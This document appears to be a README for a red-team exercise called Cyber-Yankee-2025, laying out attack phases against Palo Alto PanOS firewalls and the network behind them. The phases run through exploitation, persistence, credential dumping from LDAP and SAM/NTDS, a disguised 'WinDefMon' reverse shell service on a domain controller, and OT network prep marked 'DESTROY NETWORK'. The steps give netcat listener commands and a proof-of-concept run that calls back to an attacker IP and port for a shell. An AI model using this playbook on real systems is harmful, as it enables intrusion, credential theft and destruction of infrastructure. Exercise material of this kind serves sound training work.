# Cyber-Yankee-2025

### Sassy Panda

[Phase1](Phase1) - #PanOS Exploit

[Phase2](Phase2) - #PanOS Internal Reconnaissance & Enumeration

[Phase3](Phase3) - #PanOS Persistence

[Phase4](Phase4) - #PanOS proxy chains

---

[Phase5](Phase5) - #Discovery Inside Orange Space

[Phase6](Phase6) - #Credential Access (via LDAP, SAM/NTDS)


---

[Phase7](Phase7) - Lateral Movement and Persistence *DAY 3*

[Phase8](Phase8) - `WinDefMon` Reverse Shell Service on DC

[Phase9](Phase9) - OT Network Target Prep (Later Stage) *DAY 4* - DESTROY NETWORK


# Steps

1. initial access - setup initial listener (netcat/metasploit) with your (ANY PORT)
    run command: `nc -lvnp <RANDOM_HIGH_PORT_FROM_CREATED_SCRIPT>`
2. setup callback listener 63842
    run command: `nc -lvnp 63842`
3. run python:
    `python Poc.py https://<TARGET_PAL_WEB_INTERFACE_IP> <ATTACKER_IP> <ATTACKER_PORT>` # Random high port chosen in script from above